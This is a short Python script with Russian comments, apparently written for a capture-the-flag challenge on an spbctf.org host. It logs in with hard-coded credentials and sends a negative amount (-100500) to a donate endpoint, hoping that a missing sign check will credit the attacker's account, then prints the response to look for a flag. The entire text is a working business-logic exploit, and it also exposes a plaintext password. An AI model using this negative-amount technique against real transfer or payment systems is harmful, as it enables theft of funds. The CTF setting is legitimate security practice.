import requests

# Авторизуйся (замени данные)
s = requests.Session()
s.post("https://t-alps-st3m1pff.spbctf.org/login", data={"user": "lysh", "pass": "OOOjil123erki$"})

# Попробуй перевести "минус" минуты (если система не проверяет)
r = s.post("https://t-alps-st3m1pff.spbctf.org/donate/t-ctf.ru", json={
    "recipient": "lysh",  # или оставь пустым, если можно
    "amount": -100500  # если списание идёт с получателя, то минус добавит тебе
})
print(r.text)  # ищи флаг или сообщение об успехе